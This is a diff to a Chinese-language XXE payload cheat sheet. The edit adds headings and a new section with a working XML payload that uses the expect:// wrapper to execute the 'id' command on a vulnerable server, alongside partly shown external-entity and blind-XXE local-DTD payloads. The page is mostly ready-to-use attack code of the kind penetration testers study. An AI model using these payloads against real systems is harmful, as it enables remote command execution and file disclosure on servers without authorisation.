@@ -1,6 +1,6 @@
 # XXE
 
-外部实体
+## 外部实体 (libxml < 2.90)
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -14,7 +14,7 @@
 ```
 
 
-Blind-XXE 引用本地DTD
+## Blind-XXE 引用本地DTD
 利用 ISOamsa
 
 ```xml
@@ -31,6 +31,18 @@ Blind-XXE 引用本地DTD
 ]
 ```
 
+## except:// 协议rce
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+ <!ENTITY xxe SYSTEM "expect://id">
+ ]>
+
+ <userInfo>
+  <name>&xxe;</name>
+ </userInfo>
+```
 ## 参考资料
 
 https://xz.aliyun.com/t/3357
